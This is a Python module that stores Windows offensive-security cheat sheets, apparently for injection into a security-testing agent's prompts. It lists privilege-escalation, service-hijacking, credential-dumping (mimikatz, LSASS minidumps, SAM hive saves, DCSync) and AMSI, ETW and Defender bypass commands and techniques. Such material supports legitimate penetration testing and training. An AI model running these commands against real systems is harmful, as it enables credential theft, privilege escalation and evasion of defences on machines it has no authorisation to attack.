"""Windows security knowledge base.

Deep knowledge about Windows security:
1. Windows privilege escalation
2. Windows service exploitation
3. Registry and GPO attacks
4. Windows credential attacks
5. Windows defense bypass
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WinSecPattern:
    """A Windows security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


WINSEC_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "win-001", "name": "Windows Privilege Escalation",
        "category": "privesc", "severity": "critical",
        "desc": "Windows privilege escalation.",
        "detection": (
            "WINDOWS PRIVILEGE ESCALATION:\n"
            "UNQUOTED SERVICE PATHS:\n"
            "  # Find unquoted paths\n"
            "  wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"\n"
            "  # If path has spaces and no quotes\n"
            "  # Place binary at shorter path\n"
            "WEAK SERVICE PERMISSIONS:\n"
            "  # Check with accesschk (Sysinternals)\n"
            "  accesschk.exe -wuvc *\n"
            "  # sc qc ServiceName (check config)\n"
            "  # Modify binpath to payload\n"
            "ALWAYS INSTALL ELEVATED:\n"
            "  # Check registry\n"
            "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "  # If both = 1, create MSI payload\n"
            "TOKEN MANIPULATION:\n"
            "  - SeImpersonatePrivilege (Potato attacks)\n"
            "  - JuicyPotato, PrintSpoofer, GodPotato\n"
            "  - SeDebugPrivilege (process injection)\n"
            "  - SeBackupPrivilege (read any file)\n"
            "  - SeRestorePrivilege (write any file)\n"
            "DLL HIJACKING:\n"
            "  - DLL search order abuse\n"
            "  - Missing DLLs\n"
            "  - Writable DLL directories\n"
            "  - Phantom DLL loading\n"
            "TOOLS:\n"
            "  WinPEAS, PowerUp, SharpUp, PrivescCheck"
        ),
        "tools": ["winpeas"],
    },
    {
        "id": "win-002", "name": "Windows Service Exploitation",
        "category": "services", "severity": "high",
        "desc": "Windows service exploitation.",
        "detection": (
            "WINDOWS SERVICE EXPLOITATION:\n"
            "ENUMERATION:\n"
            "  # List all services\n"
            "  sc query state= all\n"
            "  Get-Service | Select Name,Status,StartType\n"
            "  # Service permissions\n"
            "  accesschk.exe -wuvc ServiceName\n"
            "  # Service binary paths\n"
            "  wmic service get name,pathname\n"
            "ATTACKS:\n"
            "  BINARY REPLACEMENT:\n"
            "    - Replace service binary with payload\n"
            "    - Requires write access to binary path\n"
            "    - Restart service for execution\n"
            "  CONFIG MODIFICATION:\n"
            "    - Change binpath to payload\n"
            "    sc config SvcName binpath= \"cmd /c payload\"\n"
            "    - Change start type to auto\n"
            "    - Change service account\n"
            "  NAMED PIPES:\n"
            "    - Impersonate through named pipe\n"
            "    - PrintSpoofer technique\n"
            "    - SpoolFool technique\n"
            "  SCHEDULED TASKS:\n"
            "    - Writable task files\n"
            "    - Task binary replacement\n"
            "    - New task creation\n"
            "    schtasks /query /fo csv /v\n"
            "TOOLS:\n"
            "  accesschk, sc.exe, PowerUp"
        ),
        "tools": [],
    },
    {
        "id": "win-003", "name": "Registry and GPO Attacks",
        "category": "registry_gpo", "severity": "high",
        "desc": "Registry and GPO attacks.",
        "detection": (
            "REGISTRY & GPO ATTACKS:\n"
            "REGISTRY:\n"
            "  # AutoRun locations\n"
            "  reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            "  reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            "  # Stored credentials\n"
            "  reg query HKLM /f password /t REG_SZ /s\n"
            "  reg query HKCU /f password /t REG_SZ /s\n"
            "  # AutoLogon credentials\n"
            "  reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n"
            "  # Writable registry keys\n"
            "  # Replace service imagepath\n"
            "GROUP POLICY:\n"
            "  - GPP passwords (cpassword)\n"
            "  # findstr /S /I cpassword \\\\DC\\sysvol\\*.xml\n"
            "  - GPO modification (if writable)\n"
            "  - Logon script injection\n"
            "  - Scheduled task via GPO\n"
            "  - Software installation via GPO\n"
            "  - Registry modification via GPO\n"
            "SYSVOL:\n"
            "  - Scripts with credentials\n"
            "  - VBS/BAT/PS1 files\n"
            "  - Configuration files\n"
            "  - Network share credentials\n"
            "TOOLS:\n"
            "  reg.exe, SharpGPOAbuse, PowerView"
        ),
        "tools": [],
    },
    {
        "id": "win-004", "name": "Windows Credential Attacks",
        "category": "win_creds", "severity": "critical",
        "desc": "Windows credential attacks.",
        "detection": (
            "WINDOWS CREDENTIAL ATTACKS:\n"
            "LSASS:\n"
            "  # mimikatz\n"
            "  privilege::debug\n"
            "  sekurlsa::logonpasswords\n"
            "  # Procdump\n"
            "  procdump -ma lsass.exe lsass.dmp\n"
            "  # comsvcs.dll (LOLBin)\n"
            "  rundll32 comsvcs.dll, MiniDump PID out full\n"
            "  # pypykatz (offline)\n"
            "  pypykatz lsa minidump lsass.dmp\n"
            "SAM DATABASE:\n"
            "  # Save SAM/SYSTEM hives\n"
            "  reg save HKLM\\SAM sam.bak\n"
            "  reg save HKLM\\SYSTEM system.bak\n"
            "  # Volume Shadow Copy\n"
            "  vssadmin create shadow /for=C:\n"
            "  # secretsdump.py (Impacket)\n"
            "  secretsdump.py LOCAL -sam sam -system system\n"
            "CACHED CREDENTIALS:\n"
            "  # DCC2 hashes (10 cached by default)\n"
            "  # Slow to crack but persistent\n"
            "DPAPI:\n"
            "  # Browser passwords\n"
            "  # WiFi passwords\n"
            "  # Credential Manager\n"
            "  # SharpDPAPI, mimikatz dpapi module\n"
            "NTDS.DIT:\n"
            "  # All AD hashes\n"
            "  # DCSync\n"
            "  mimikatz: lsadump::dcsync /domain:X /user:krbtgt\n"
            "  # secretsdump.py\n"
            "  secretsdump.py DOMAIN/admin@DC -just-dc\n"
            "TOOLS:\n"
            "  mimikatz, pypykatz, secretsdump, SharpDPAPI"
        ),
        "tools": ["mimikatz"],
    },
    {
        "id": "win-005", "name": "Windows Defense Bypass",
        "category": "defense_bypass", "severity": "critical",
        "desc": "Windows security mechanism bypass.",
        "detection": (
            "WINDOWS DEFENSE BYPASS:\n"
            "UAC BYPASS:\n"
            "  - fodhelper.exe\n"
            "  - eventvwr.exe\n"
            "  - sdclt.exe\n"
            "  - computerdefaults.exe\n"
            "  - UACME (all known bypasses)\n"
            "APPLOCKER/WDAC BYPASS:\n"
            "  - Trusted binaries (MSBuild, InstallUtil)\n"
            "  - DLL sideloading\n"
            "  - Alternate data streams\n"
            "  - Script hosts (wscript, cscript)\n"
            "  - PowerShell Constrained Language Mode bypass\n"
            "AMSI BYPASS:\n"
            "  - AMSI.dll patching (in-memory)\n"
            "  - Reflection-based null amsiContext\n"
            "  - PowerShell version downgrade\n"
            "  - String obfuscation\n"
            "  - Custom .NET assemblies\n"
            "DEFENDER:\n"
            "  - Exclusion paths (if admin)\n"
            "  - Disable real-time protection\n"
            "  - In-memory execution\n"
            "  - Obfuscated payloads\n"
            "  - Custom C2 (unknown signatures)\n"
            "ETW BYPASS:\n"
            "  - Patch EtwEventWrite in ntdll\n"
            "  - Disable .NET ETW provider\n"
            "  - Unregister ETW providers\n"
            "TOOLS:\n"
            "  UACME, ScareCrow, Invoke-Obfuscation"
        ),
        "tools": [],
    },
]


class WindowsSecurityKB:
    """Windows security knowledge base.

    Provides Windows security patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WinSecPattern] = {}
        self._log = logger.bind(component="winsec_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load Windows security patterns."""
        for data in WINSEC_PATTERNS:
            pattern = WinSecPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[WinSecPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_winsec_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build Windows security prompt."""
        lines = ["## Windows Security\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
